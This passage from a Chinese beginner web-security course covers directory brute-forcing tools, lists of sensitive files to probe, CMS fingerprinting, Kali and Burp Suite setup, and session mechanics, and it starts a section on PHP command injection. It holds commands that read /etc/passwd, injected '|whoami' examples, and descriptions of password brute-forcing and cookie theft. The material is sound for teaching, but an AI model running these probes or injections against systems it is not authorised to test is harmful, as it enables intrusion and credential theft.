   - 500           → 服务器错误（可能有戏）
4. 记录所有非404的路径
```

**常用工具使用：**

**1. dirsearch（推荐，Python编写，功能丰富，中文用户友好）**
```bash
# 安装
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
pip install -r requirements.txt

# 基本使用
python dirsearch.py -u http://example.com

# 指定扩展名（最常用！）
python dirsearch.py -u http://example.com -e php,asp,aspx,jsp,html,zip,bak,txt,conf
# -e 指定要扫描的文件扩展名，会在字典条目后加上这些后缀
# 例如字典里有admin，会同时尝试admin.php、admin.zip、admin.bak等

# 指定字典文件
python dirsearch.py -u http://example.com -e php -w /path/to/wordlist.txt

# 线程数
python dirsearch.py -u http://example.com -e php -t 50   # 50线程（默认25）

# 过滤状态码
python dirsearch.py -u http://example.com -e php -x 404,500     # 不显示404和500
python dirsearch.py -u http://example.com -e php -i 200,301,403 # 只显示指定状态码

# 带Cookie扫描（需要登录的页面）
python dirsearch.py -u http://example.com -e php --cookie="PHPSESSID=abc123; is_admin=1"

# 保存结果
python dirsearch.py -u http://example.com -e php -o result.txt --format plain

# 递归扫描（发现目录后继续扫描该目录下的内容）
python dirsearch.py -u http://example.com -e php -r

# 扩展（递归深度）
python dirsearch.py -u http://example.com -e php -r -R 3   # 递归深度3层

# 设置请求头
python dirsearch.py -u http://example.com -e php -H "User-Agent: Mozilla/5.0"

# 使用代理（配合Burp查看请求）
python dirsearch.py -u http://example.com -e php --proxy=http://127.0.0.1:8080
```

**2. gobuster（Go编写，速度极快）**
```bash
# 安装（Kali自带）
sudo apt install gobuster

# 目录扫描模式
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# 常用参数
gobuster dir -u http://example.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,zip,bak,html \          # 文件扩展名
  -t 50 \                             # 50线程
  -o result.txt \                     # 输出文件
  -s 200,301,302,403 \               # 显示这些状态码
  -b 404 \                            # 过滤404
  -c "PHPSESSID=abc123"              # Cookie
```

**3. dirb（简单易用，Kali自带）**
```bash
# 基本使用
dirb http://example.com

# 指定字典
dirb http://example.com /usr/share/wordlists/dirb/common.txt

# 指定扩展名
dirb http://example.com -X .php,.txt,.zip

# 带Cookie
dirb http://example.com -c "PHPSESSID=abc123"

# 不递归
dirb http://example.com -r
```

**4. ffuf（Fuzz工具，也可以做目录扫描，速度极快）**
```bash
# 安装
go install github.com/ffuf/ffuf/v2@latest

# 基本目录扫描（FUZZ是占位符，会被字典替换）
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# 带扩展名
ffuf -u http://example.com/FUZZ -w wordlist.txt -e .php,.zip,.bak,.txt

# 过滤404
ffuf -u http://example.com/FUZZ -w wordlist.txt -fc 404

# 匹配200/301/403
ffuf -u http://example.com/FUZZ -w wordlist.txt -mc 200,301,403

# 递归扫描
ffuf -u http://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2
```

**常用字典位置（Kali Linux）：**
```
/usr/share/wordlists/dirb/common.txt          # dirb默认字典（4614个词，入门够用）
/usr/share/wordlists/dirb/big.txt             # dirb大字典（20469个词）
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  # dirbuster中字典（220730个词）
/usr/share/seclists/Discovery/Web-Content/    # Seclists字典目录（非常全面）

# 安装Seclists（最好的安全测试字典集合）
sudo apt install seclists
# 安装后在 /usr/share/seclists/ 下
# 推荐字典：
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt   # 3万目录
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt         # 3万文件
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt    # 12万大字典
```

**目录扫描重点关注的文件和路径：**
```
敏感目录：
  /admin/、/manage/、/manager/、/backend/、/system/
  /wp-admin/（WordPress后台）、/administrator/（Joomla后台）
  /backup/、/bak/、/old/、/temp/、/tmp/、/test/
  /upload/、/uploads/、/file/、/files/、/data/
  /phpmyadmin/、/pma/、/myadmin/、/adminer.php（数据库管理）
  /dev/、/debug/、/demo/、/staging/（测试环境）
  /console/、/terminal/、/shell/
  /api/、/api/v1/、/swagger/（API接口）
  /.git/、/.svn/、/.hg/（版本控制，源码泄露！）
  /.idea/（PHPStorm项目文件，可能泄露路径）
  /cgi-bin/（可能有Shellshock漏洞）

敏感文件：
  robots.txt                 爬虫规则！第一时间看这个，Disallow的路径可能是敏感路径
  sitemap.xml                网站地图，列出所有URL
  .git/config                Git配置泄露，可能泄露源码地址
  .git/HEAD                  Git存在标识
  .env                       环境变量配置（可能有数据库密码、API密钥）
  .htaccess                  Apache配置文件
  .DS_Store                  Mac的目录文件，记录了文件名
  crossdomain.xml            Flash跨域策略文件
  clientaccesspolicy.xml     Silverlight跨域策略
  web.config                 IIS配置文件
  phpinfo.php、info.php、test.php、pi.php、1.php  php探针/测试文件
  www.zip、www.rar、web.zip、backup.zip、site.zip、www.tar.gz  整站源码备份
  config.php、db.php、database.php、conn.php、common.php  配置文件（含密码）
  *.bak、*.swp、*.old、*.orig、*.save  各种编辑器/操作留下的备份文件
  error_log、error.log、access_log  日志文件
  favicon.ico                可以用于计算hash指纹
  crossdomain.xml            Flash跨域文件
```

**其他信息收集技巧：**
```
# 1. 查看robots.txt（第一步必看！）
访问 http://example.com/robots.txt
Disallow: /admin/        → 告诉爬虫不要爬/admin/，说明这个路径存在！
Disallow: /backup/       → 告诉爬虫不要爬/backup/，一定要看！

# 2. 查看sitemap.xml
访问 http://example.com/sitemap.xml
网站地图会列出网站希望搜索引擎收录的URL，有时包含后台或其他敏感路径

# 3. 查看.htaccess（Apache）
如果能访问.htaccess，能知道重写规则和受保护的目录

# 4. 查看JS文件
访问网站后，Burp爬取或浏览器F12查看Network中加载的JS文件
JS文件中可能包含API接口、隐藏路径、AJAX请求路径、注释中的开发者信息
用LinkFinder等工具提取JS中的路径：
python LinkFinder.py -i http://example.com -d

# 5. 网站历史快照
Wayback Machine：https://web.archive.org
可以查看网站历史版本，可能现在删掉的老版本有漏洞或敏感文件
```

---

#### 2.2.5 指纹识别

**什么是指纹识别？**
```
识别网站使用的技术栈：
- 操作系统：Linux / Windows
- Web服务器：Nginx / Apache / IIS / OpenResty
- 编程语言：PHP / Java / Python / ASP.NET / Node.js
- CMS系统：WordPress / Discuz / Drupal / ThinkPHP / 织梦 / PHPCMS / EmpireCMS
- 框架：Laravel / Spring Boot / Django / Flask / Express / Rails
- JS框架：jQuery / Vue / React / Angular
- CDN：Cloudflare / 阿里云CDN / 腾讯云CDN
- WAF：安全狗 / 云锁 / 阿里云WAF / 腾讯云WAF / Cloudflare
- 数据库：MySQL / PostgreSQL / MSSQL / Oracle / MongoDB / Redis

为什么要识别指纹？
知道了具体CMS/框架和版本号，就可以去查该版本是否有公开的漏洞（Nday），
直接利用已知漏洞进行攻击，而不需要自己挖0day。
比如识别出目标是ThinkPHP 5.0.22，就可以直接用ThinkPHP 5.0.x RCE漏洞getshell。
```

**指纹识别方法：**

**1. Wappalyzer（最方便，浏览器插件，必装！）**
```
安装：
Chrome/Edge：在Chrome应用商店搜索Wappalyzer安装
Firefox：附加组件中搜索Wappalyzer安装

使用：
安装后浏览器右上角会有一个W图标，访问网站时点击该图标，
就能看到该网站使用的技术栈，包括：
- CMS
- 编程语言
- Web服务器
- 框架
- JavaScript库
- CDN
- 分析工具
- 等等

优点：图形界面，使用方便，识别较准确
缺点：只能识别浏览器当前访问的页面，不能批量扫描
```

**2. whatweb（命令行工具，Kali自带）**
```bash
# 基本使用
whatweb http://example.com

# 更详细输出
whatweb -v http://example.com

# 批量扫描（从文件读取目标）
whatweb -i targets.txt

# 输出到文件
whatweb http://example.com --log-json=result.json
whatweb http://example.com --log-xml=result.xml
```

**3. 手动识别（有时候工具识别不了，需要手动判断）**

**方法1：查看HTTP响应头**
```
在Burp Suite中或浏览器F12的Network中查看响应头：

Server: nginx/1.18.0           → Nginx 1.18.0
Server: Apache/2.4.29 (Ubuntu) → Apache 2.4.29，Ubuntu系统
Server: Microsoft-IIS/10.0     → IIS 10.0（Windows Server 2016/2019）
X-Powered-By: PHP/7.4.3        → PHP 7.4.3版本
X-Powered-By: Express          → Express框架（Node.js）
X-Powered-By: ASP.NET          → ASP.NET
X-AspNet-Version: 4.0.30319    → .NET Framework版本

注意：
- 有些网站会故意修改Server信息（比如Nginx改名为WebServer）来隐藏真实信息
- X-Powered-By有些网站会删除
- 响应头只能作为参考
```

**方法2：查看Set-Cookie中的Cookie名称**
```
Cookie名称是识别语言/框架最准确的方式之一：

PHPSESSID=xxx              → PHP网站（最常见）
JSESSIONID=xxx             → Java网站（Tomcat/Spring等）
ASP.NET_SessionId=xxx      → ASP.NET
ci_session=xxx             → CodeIgniter框架（PHP）
laravel_session=xxx        → Laravel框架（PHP）
thinkphp_template=xxx      → ThinkPHP框架
wordpress_logged_in_xxx    → WordPress（WordPress登录后的Cookie）
wp-settings-xxx            → WordPress
django_session=xxx         → Django框架（Python）
sessionid=xxx              → Django或其他Python框架
connect.sid=xxx            → Express/Node.js
PHPSESSID=xxx; path=/thinkphp  → ThinkPHP
```

**方法3：查看网页源码特征**
```
访问页面右键→查看源代码，看注释、路径、特征字符串：

WordPress特征：
- /wp-content/themes/ 路径
- /wp-includes/ 路径
- /wp-json/ API路径
- meta标签 <meta name="generator" content="WordPress x.x.x">
- /wp-login.php 登录页
- /xmlrpc.php 文件存在

Discuz（discuz论坛）特征：
- /source/plugin/
- /template/default/
- /uc_server/
- 页面底部有"Powered by Discuz!"
- 源码中有 discuz_tpl 或 zhanghao 等字样

织梦CMS（DedeCMS）：
- /dede/（默认后台）
- /data/
- /plus/
- /templets/
- /uploads/
- 源码中有 dedeajax 相关代码
- /include/dialog/ 路径

ThinkPHP特征：
- URL路径 /index.php?s=/xxx/xxx
- 报错页面有ThinkPHP字样和版本号
- 500错误页面可能暴露ThinkPHP版本
- /thinkphp/ 目录
- Cookie thinkphp_template

phpMyAdmin：
- /phpmyadmin/
- /pma/
- /myadmin/
- /phpMyAdmin/
```

**方法4：访问特定图标favicon.ico计算hash**
```
每个网站通常有自己的favicon.ico（浏览器标签页小图标），
不同CMS有不同的favicon，可以计算favicon的MD5 hash来快速识别。

工具：
- 在线favicon hash查询：https://favicon-hash.kmsec.cn/
- 可以在FOFA中搜索：icon_hash="-1234567890"

步骤：
1. 获取网站favicon：http://example.com/favicon.ico
2. 计算hash
3. 在FOFA/Hunter中搜索相同hash的站点
```

**方法5：访问特有文件和路径**
```
WordPress特有文件：
- /readme.html → WordPress版本信息
- /wp-json/   → WP REST API
- /license.txt

ThinkPHP特有：
- /?s=captcha  → 是否有验证码路由
- 报错页面
```

---

### 2.3 VMware与Kali Linux安装

#### 2.3.1 VMware Workstation安装
```
VMware Workstation Pro是最常用的桌面虚拟化软件，可以在Windows上运行虚拟机。

安装步骤：
1. 下载安装包
   官网：https://www.vmware.com/products/workstation-pro.html
   或者从国内下载站下载

2. 运行安装程序
   右键以管理员身份运行

3. 安装向导
   - 下一步 → 接受许可协议
   - 选择安装路径（建议不要装C盘，选一个空间大的盘）
   - 用户体验设置：两个复选框（检查更新、加入体验计划）可以取消勾选
   - 快捷方式：按需勾选
   - 点击安装，等待几分钟

4. 完成后输入许可证密钥激活（或选择试用）
5. 安装完成重启电脑
```

#### 2.3.2 Kali Linux安装（推荐OVA导入方式，最简单）

**Kali Linux介绍：**
```
Kali Linux是基于Debian的Linux发行版，专门为渗透测试和安全审计设计，
预装了600+安全工具，包括Nmap、Burp Suite、Metasploit、Sqlmap、Hydra、
John the Ripper、Aircrack-ng、Wireshark等，是安全从业者最常用的系统。
```

**方式一：OVA导入（强烈推荐，5分钟搞定）**
```
1. 下载Kali VMware镜像
   官网：https://www.kali.org/get-kali/#kali-virtual-machines
   选择 "VMware" → 下载 Pre-built VM image（.7z压缩包，约3-4GB）
   
2. 解压
   用7-Zip解压下载的.7z文件，得到一个 .ova 文件

3. 导入到VMware
   - 打开VMware Workstation
   - 点击菜单：文件 → 打开（或Ctrl+O）
   - 选择解压出来的 .ova 文件
   - 给虚拟机起个名字，选择存储路径（建议空间大的盘）
   - 点击"导入"，等待导入完成

4. 配置虚拟机（开机前必须做！）
   在VMware中选中导入的Kali虚拟机，点击"编辑虚拟机设置"：
   - 内存：建议4GB（4096MB）以上
     如果你的电脑内存16G，给Kali分8G；如果8G，至少给4G
   - 处理器：处理器数量1，每个处理器核心数2-4核
   - 硬盘：默认80G一般够用
   - 网络适配器：选择NAT模式（推荐入门用）
     - NAT模式：虚拟机通过主机共享上网，最简单，推荐
     - 桥接模式：虚拟机和主机在同一个局域网，相当于局域网内一台独立机器
     - 仅主机模式：只能和主机通信，不能上网
   - USB控制器、声卡、打印机：不需要可以移除，节省资源

5. 启动登录
   点击"开启此虚拟机"
   默认凭据：
   用户名：kali
   密码：kali
   （Kali 2020.1之后的版本默认用户是kali/kali，老版本是root/toor）

6. 初始配置（第一次开机必做）
   打开终端，执行以下命令：
   
   # 换国内源（下载速度从几KB/s变成几MB/s）
   sudo vim /etc/apt/sources.list
   
   在文件开头添加（注释掉默认的源，选一个添加）：
   # 中科大源
   deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
   deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
   
   # 阿里云源
   # deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
   # deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib
   
   保存退出（vim操作：按i进入编辑模式，粘贴完按Esc，输入:wq回车）
   
   # 更新系统
   sudo apt update
   sudo apt full-upgrade -y
   # 这一步需要较长时间（30分钟到几小时取决于网速），耐心等待
```

**安装VMware Tools（实现主机和虚拟机拖放文件、复制粘贴）：**
```bash
# Kali默认预装了open-vm-tools，如果没有：
sudo apt install open-vm-tools-desktop fuse -y
# 安装后重启虚拟机生效
```

**开启SSH（可选，方便用Xshell等工具连接）：**
```bash
sudo systemctl start ssh      # 启动SSH服务
sudo systemctl enable ssh     # 设置开机自启

# 查看Kali的IP
ip a
# 然后就可以在主机用Xshell/Finalshell等工具通过SSH连接Kali了
```

**切换中文（可选）：**
```bash
sudo dpkg-reconfigure locales
# 找到 zh_CN.UTF-8 UTF-8，空格选中，Tab到确定回车
# 下一步默认选 zh_CN.UTF-8
# 重启生效

# 安装中文字体防止乱码
sudo apt install fonts-wqy-microhei fonts-wqy-zenhei -y
# 建议初学者还是用英文系统，避免路径和命令出现乱码问题
```

---

### 2.4 PHPStudy及PHP环境搭建

**PHPStudy（小皮面板）：**
```
PHPStudy是一个Windows下的集成环境，一键安装Apache/Nginx+PHP+MySQL+phpMyAdmin，
不需要自己一个个配置，是本地搭建PHP测试环境最方便的工具。
```

**安装配置：**
```
1. 下载
   官网：https://www.xp.cn
   下载Windows版本

2. 安装
   双击安装程序，选择安装路径（注意：路径不要有中文和空格！！比如不要装在"D:\我的软件"）
   等待安装完成

3. 启动服务
   打开PHPStudy面板
   - 点击Apache或Nginx的启动按钮（Web服务器）
   - 点击MySQL的启动按钮（数据库）
   - 两个都显示绿色圆点就是启动成功了

4. 网站根目录
   默认网站根目录：PHPStudy安装目录/WWW/
   例如 D:\phpstudy_pro\WWW\
   把PHP文件放到这个目录下，就能通过 http://localhost/ 访问

5. 创建网站（可选）
   PHPStudy面板 → 网站 → 创建网站：
   - 域名：比如 test.local
   - 根目录：选择你的代码目录
   - PHP版本：可以选PHP 5.x/7.x/8.x（建议同时有7.0和7.4版本，很多漏洞在7.0-7.3存在）
   - 点击确认
   
   修改hosts文件（让test.local指向本机）：
   以管理员身份打开记事本 → 文件 → 打开 → C:\Windows\System32\drivers\etc\hosts
   在文件末尾添加：127.0.0.1 test.local
   保存后就能通过 http://test.local/ 访问了

6. 测试PHP
   在WWW目录下创建info.php，内容：
   <?php phpinfo(); ?>
   浏览器访问 http://localhost/info.php
   看到PHP信息页面说明环境搭建成功
```

**PHP基础语法速查（理解漏洞必看）：**
```php
<?php
// ====== 变量 ======
// PHP变量以$开头，不需要声明类型
$name = "张三";
$age = 18;
$is_admin = true;

// ====== 输出 ======
echo "hello";               // 输出字符串
print_r($arr);              // 打印数组结构
var_dump($age);             // 输出变量类型和值：int(18)

// ====== 数组 ======
// 索引数组
$arr = ["a", "b", "c"];
echo $arr[0];               // a

// 关联数组（类似字典）
$user = ["name" => "admin", "age" => 20];
echo $user["name"];         // admin

// ====== 字符串拼接 ======
// PHP中用点.拼接，不是+号！
echo "Hello, " . $name;     // Hello, 张三
echo "姓名：$name";          // 双引号内变量会被解析

// ====== 超全局变量（重点！漏洞大多出现在这里！）======
// 用户所有的输入都来自这些超全局变量，它们是数组，可以在任何地方访问

// $_GET：获取URL中的GET参数
// 访问 http://localhost/test.php?id=1&name=admin
$id = $_GET['id'];          // "1"
$name = $_GET['name'];      // "admin"

// $_POST：获取POST请求体中的参数（表单提交）
$username = $_POST['username'];
$password = $_POST['password'];

// $_REQUEST：包含$_GET + $_POST + $_COOKIE（不推荐使用，不安全）

// $_COOKIE：获取浏览器Cookie
$session = $_COOKIE['PHPSESSID'];

// $_SERVER：服务器和请求的环境信息
echo $_SERVER['REMOTE_ADDR'];   // 客户端IP
echo $_SERVER['HTTP_USER_AGENT']; // 浏览器UA
echo $_SERVER['REQUEST_URI'];   // 请求的URI路径

// $_FILES：文件上传的信息
$upload_file = $_FILES['file'];

// $_SESSION：会话变量（需要先session_start()）
session_start();
$_SESSION['user'] = "admin";
echo $_SESSION['user'];
?>
```

---

### 2.5 Python环境配置（写EXP必备）

```
安装步骤（Windows）：
1. 下载：https://www.python.org/downloads/
2. 安装时！！务必勾选 "Add Python to PATH"
3. 安装完成后打开cmd验证：
   python --version
   pip --version

pip换国内源（推荐，下载速度快）：
pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple
```

**安全方向常用Python库：**
```bash
pip install requests         # HTTP请求（写EXP最常用）
pip install beautifulsoup4   # HTML解析
pip install pycryptodome     # 加密解密（AES/RSA等）
pip install pwntools         # Pwn二进制利用
```

**Python requests库基础（写EXP必掌握）：**
```python
import requests

# GET请求
r = requests.get("http://example.com")
print(r.status_code)         # 状态码200
print(r.text)                # 响应内容

# 带GET参数（自动拼接URL）
params = {"id": "1", "name": "admin"}
r = requests.get("http://example.com", params=params)
# 实际访问 http://example.com?id=1&name=admin

# POST请求（表单提交）
data = {"username": "admin", "password": "123456"}
r = requests.post("http://example.com/login", data=data)

# POST请求（JSON提交）
import json
r = requests.post("http://example.com/api", json={"name": "test"})

# 带请求头（模拟浏览器，带Cookie）
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Cookie": "PHPSESSID=abc123"
}
r = requests.get("http://example.com", headers=headers)

# Session保持会话（自动管理Cookie）
s = requests.Session()
s.post("http://example.com/login", data={"user": "admin", "pass": "123"})
r = s.get("http://example.com/admin")  # 自动带上登录后的Cookie

# 代理设置（配合Burp Suite抓包）
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("http://example.com", proxies=proxies, verify=False)
# verify=False忽略HTTPS证书错误
```

---

### 2.6 Burp Suite安装与使用（Web安全最重要工具！！！必学）

**Burp Suite介绍：**
```
Burp Suite是Web安全渗透测试中最常用、最重要的工具，没有之一！
它是一个集成平台，包含了抓包改包、爆破、重放、爬虫、扫描等众多功能。
几乎所有Web渗透测试和CTF Web题目都要用到Burp。
```

**版本说明：**
```
- Community Edition（社区版）：免费，功能有限（没有主动扫描、没有部分Intruder payload类型）
- Professional Edition（专业版）：收费，功能完整（推荐！）
- 学习阶段用社区版足够入门，进阶建议用专业版
```

**安装步骤：**
```
1. 下载
   官网：https://portswigger.net/burp/releases/community/latest
   下载对应系统的安装包（Windows选Windows Installer）

2. 安装
   双击安装包，一路Next即可
   需要提前安装好JDK（Burp是Java编写的），如果没装会提示安装

3. 启动
   安装完成后双击Burp Suite Community Edition启动
   第一次启动：
   - 选择 Temporary Project（临时项目）→ Next
   - 选择 Use Burp Defaults（使用默认配置）→ Start Burp
   进入Burp主界面
```

**配置浏览器代理（关键！让Burp能抓到浏览器的包）：**
```
原理：Burp通过代理方式工作——浏览器把所有请求发给Burp，Burp再转发给服务器；
     服务器响应先给Burp，Burp再转发给浏览器。这样Burp就能看到并修改所有流量。

以Chrome/Edge为例（推荐用Firefox或Chrome+SwitchyOmega插件）：

方法1：SwitchyOmega插件（最方便，推荐！）
1. Chrome应用商店搜索安装 Proxy SwitchyOmega
2. 配置代理情景模式：
   - 代理协议：HTTP
   - 代理服务器：127.0.0.1
   - 代理端口：8080
3. 点击插件图标切换到Burp代理模式

方法2：系统代理设置
1. Windows设置 → 网络和Internet → 代理
2. 开启"使用代理服务器"
3. 地址：127.0.0.1，端口：8080
4. 保存
```

**安装Burp的HTTPS证书（否则抓不了HTTPS包！）：**
```
Burp默认能抓HTTP，但HTTPS是加密的，需要安装Burp的CA证书才能解密HTTPS流量：

步骤：
1. 确保浏览器代理已设置为127.0.0.1:8080，Burp已打开
2. 浏览器访问 http://burp （注意是http不是https）
3. 点击页面右上角的 "CA Certificate" 下载证书文件（cacert.der）
4. 安装证书：
   Chrome/Edge：设置 → 隐私和安全 → 安全 → 管理证书 → 受信任的根证书颁发机构 → 导入
   Firefox：设置 → 隐私与安全 → 证书 → 查看证书 → 导入
   选择下载的cacert.der，勾选"信任此CA颁发的证书"，导入
5. 重启浏览器，现在就能抓HTTPS包了！
```

**Burp核心模块详解：**

**1. Proxy（代理模块，最基础最常用）**
```
Proxy是Burp的心脏，负责拦截和查看所有HTTP/HTTPS流量。

子标签：
- Intercept（拦截）：
  - Intercept is on/off：开启/关闭拦截
    - on：请求会被拦截下来，需要手动点Forward才能发送（可以改包）
    - off：请求正常发送，不拦截，但仍然记录在HTTP history中
  - Forward：放行当前拦截的请求
  - Drop：丢弃当前请求（不发送）
  - Action：发送到其他模块（Repeater/Intruder等）

- HTTP history（HTTP历史记录）：
  记录所有经过Burp的HTTP请求和响应，非常重要！
  每一条记录可以看到：
  - Host（主机）、Method（方法）、URL（路径）
  - Params（参数）、Status（状态码）、Length（长度）
  点击任意一条可以在下方查看完整的请求和响应

- WebSockets history：WebSocket流量记录
- Options：代理设置（默认监听127.0.0.1:8080，一般不用改）

使用场景：
- 提交表单时开启Intercept，可以修改请求参数（比如把id=1改成id=2越权）
- 查看HTTP history中所有请求，找API接口、找隐藏参数
```

**2. Repeater（重放模块，第二常用！）**
```
Repeater用于修改并重放请求——可以反复修改请求参数、发送、查看响应，
是手动测试漏洞最常用的模块。

使用方法：
1. 在Proxy的HTTP history或Intercept中，右键感兴趣的请求
2. 选择 "Send to Repeater"（或快捷键Ctrl+R）
3. 切换到Repeater标签
4. 左侧Request区域可以修改请求内容（改参数、加Header等）
5. 点击Send按钮发送
6. 右侧Response区域查看响应结果
7. 可以反复修改、发送、对比响应

典型用途：
- SQL注入测试：在参数后面加'看报错，反复调整注入语句
- 命令执行测试：拼接|whoami等看结果
- 越权测试：修改Cookie中的用户ID看能否访问他人数据
- 逻辑漏洞：修改订单金额等
```

**3. Intruder（爆破模块）**
```
Intruder用于自动化批量发送请求，可以对请求中的特定位置枚举各种payload。
常用于爆破密码、枚举用户ID、fuzz参数等。

使用方法：
1. 在Proxy中右键请求 → Send to Intruder（Ctrl+I）
2. 切换到Intruder标签
3. Positions标签：
   -  Burp会自动用§符号标记参数位置（要爆破的地方）
   - 点击Clear §清除所有标记
   - 选中要爆破的位置（比如密码参数的值），点击Add §
   - 例如：username=admin&password=§123456§
   - Attack type（攻击类型）：
     - Sniper（狙击手）：单位置，用一个payload字典逐个替换（最常用）
     - Battering ram：多位置用相同payload
     - Pitchfork：多位置，对应字典一一对应
     - Cluster bomb：多位置，所有组合笛卡尔积（爆破用户名+密码）
4. Payloads标签：
   - Payload type：选择Simple list（简单字典）
   - Payload Options：点击Load从文件加载字典，或手动Add添加payload
   - 常用字典：Kali的 /usr/share/wordlists/ 下有各种字典
5. Options标签：线程数、超时等设置
6. 点击Start attack开始爆破
7. 结果窗口中看Length或Status列，长度不同或状态不同的可能是正确密码

典型用途：
- 后台密码爆破
- 枚举用户id（id=1,2,3...）
- 验证码绕过（四位数验证码0000-9999枚举）
- 目录fuzz
- 参数fuzz
```

**4. Decoder（编码解码）**
```
用于各种编码解码和哈希计算：
- 编码：URL、HTML、Base64、Hex、ASCII、Unicode等
- 解码：同上反向
- 哈希：MD5、SHA系列

使用：输入字符串→选择编码/解码方式→自动计算
非常方便，不用再去网上找在线编解码工具。
```

**Burp使用技巧：**
```
快捷键：
- Ctrl+R：发送到Repeater
- Ctrl+I：发送到Intruder
- Ctrl+F：搜索
- Ctrl+Z：撤销

右键菜单常用选项：
- Send to Repeater：发到重放
- Send to Intruder：发到爆破
- Send to Decoder：发到解码
- Request in browser：在浏览器中重放该请求
- Change request method：切换GET/POST方法

配合浏览器：
- Proxy开着Intercept拦截请求，可以修改Cookie、POST数据、URL参数
- 改完点Forward发送，Drop丢弃
```

**Burp无法抓包常见问题排查：**
```
1. 浏览器代理没设对？→ 检查127.0.0.1:8080
2. Burp的Proxy Intercept关了？→ 不影响history，只是不拦截
3. HTTPS站点提示不安全？→ CA证书没安装正确，重新安装证书
4. 某些客户端不走系统代理？→ 需要Proxifier等工具强制走代理
5. Burp端口被占用？→ Proxy→Options改端口（如8081）
```

---

### 2.7 HTTP Cookie与Session机制详解（理解认证和会话的基础）

**为什么需要Cookie和Session？**
```
HTTP协议本身是无状态的——每个请求都是独立的，服务器不知道你是谁。
但网站需要知道你是谁（登录状态），所以有了Cookie和Session机制。
```

**Cookie工作原理：**
```
流程：
1. 浏览器第一次访问服务器，请求中没有Cookie
2. 服务器通过Set-Cookie响应头给浏览器颁发一个Cookie
3. 浏览器把Cookie保存到本地
4. 之后每次访问该网站，浏览器自动在请求头中带上这个Cookie
5. 服务器通过Cookie识别用户

Cookie属性：
- Name=Value：键值对
- Domain：作用域名（只有这个域名下才会发送）
- Path：作用路径
- Expires/Max-Age：过期时间（不设则关闭浏览器就失效）
- HttpOnly：JS无法读取（防XSS窃取Cookie）
- Secure：只在HTTPS下发送
- SameSite：跨站限制（防CSRF）
```

**Session工作原理（Cookie的一种使用方式）：**
```
问题：Cookie存在客户端浏览器中，用户可以看到和修改，不安全。
      如果把用户ID直接存在Cookie里，用户可以改成admin登录别人账号！

Session（会话）方案：
1. 用户登录成功后，服务器生成一个随机、唯一、无规律的session_id（如PHPSESSID=abc123def456）
2. 服务器在自己这边保存session数据（比如存在文件/数据库/Redis中）：
   session文件中记录：abc123def456 → {user_id: 1, username: "admin", is_login: true}
3. 服务器只通过Set-Cookie把session_id发给浏览器：Set-Cookie: PHPSESSID=abc123def456
4. 浏览器之后每次请求带上PHPSESSID=abc123def456
5. 服务器根据session_id查找对应的session数据，知道当前是哪个用户
6. 用户关闭浏览器或退出登录时，session失效

PHP中使用Session：
<?php
session_start();                    // 开启session，必须在输出之前调用
$_SESSION['username'] = "admin";    // 存数据到session
$_SESSION['is_login'] = true;

echo $_SESSION['username'];         // 读session数据
session_destroy();                  // 销毁session（退出登录）
?>
```

**Cookie和Session的区别（面试常考，安全必懂）：**
```
| 特性 | Cookie | Session |
|------|--------|---------|
| 存储位置 | 客户端浏览器 | 服务器端 |
| 安全性 | 较低，用户可查看修改 | 较高，用户拿不到真实数据 |
| 存储容量 | 单个Cookie ≤ 4KB，域名下数量有限 | 服务器存储，容量大 |
| 生命周期 | 可设置长期（记住密码） | 一般较短，关闭浏览器/超时失效 |
| 典型用途 | 记住用户名、购物车（非登录）、偏好设置 | 登录状态、用户权限、敏感数据 |
| 性能影响 | 每次请求都带上，增加流量 | 服务器查session文件/DB有开销 |
```

**安全相关点：**
```
1. Cookie窃取（XSS攻击）：
   如果Cookie没设HttpOnly，攻击者注入JS脚本document.cookie就能窃取用户Cookie，
   拿到Cookie后在自己浏览器上替换就能冒充用户登录！

2. Session固定攻击：
   攻击者让用户使用攻击者预设的session_id登录，登录后攻击者用同一session_id访问。

3. Session劫持：
   通过网络嗅探（HTTP明文）、XSS等获取用户session_id，冒充用户。

4. CSRF（跨站请求伪造）：
   利用浏览器自动带Cookie的特性，在第三方网站构造请求，用户访问时自动用
   用户的Cookie发起操作（比如转账、改密码）。
```

---

## 三、Web安全基础（一）

### 3.1 PHP命令执行漏洞（RCE）

#### 3.1.1 漏洞原理
```
命令执行漏洞（Command Injection/RCE）是最严重的Web漏洞之一。

产生原因：
Web应用调用了执行系统命令的函数（如system()、exec()、shell_exec()），
并且把用户可控的输入直接拼接到了命令字符串中，没有做严格的过滤。
攻击者可以通过命令连接符（; | &&等）注入额外命令执行，从而在服务器上
执行任意系统命令，直接控制服务器！
```

#### 3.1.2 PHP中可以执行命令的函数

**1. system() — 执行命令并直接输出结果**
```php
<?php
// 直接执行系统命令，把结果输出到页面
// 原型：string system(string $command, int &$return_var = null)

system("whoami");          // 直接输出当前用户名
system("ls -la");          // Linux列出当前目录文件
system("dir");             // Windows列目录
system("cat /etc/passwd"); // Linux读取用户列表文件
system("ipconfig");        // Windows查看IP
system("ifconfig");        // Linux查看IP
?>
```

**2. exec() — 执行命令，返回最后一行，不直接输出**
```php
<?php
// 原型：string exec(string $command, array &$output = null, int &$return_var = null)
// 不直接输出结果，返回输出的最后一行

$last_line = exec("whoami");
echo $last_line;           // 输出用户名（只有最后一行）

// 如果要获取所有输出，传第二个参数（数组引用）
exec("ls -la", $output);   // $output会被填充成数组，每行一个元素
print_r($output);          // 打印所有输出
?>
```

**3. shell_exec() / 反引号 `` — 执行命令返回完整输出字符串**
```php
<?php
// 原型：string shell_exec(string $command)
// 返回命令的完整输出（字符串）
// 注意：命令执行失败或没有输出时返回NULL

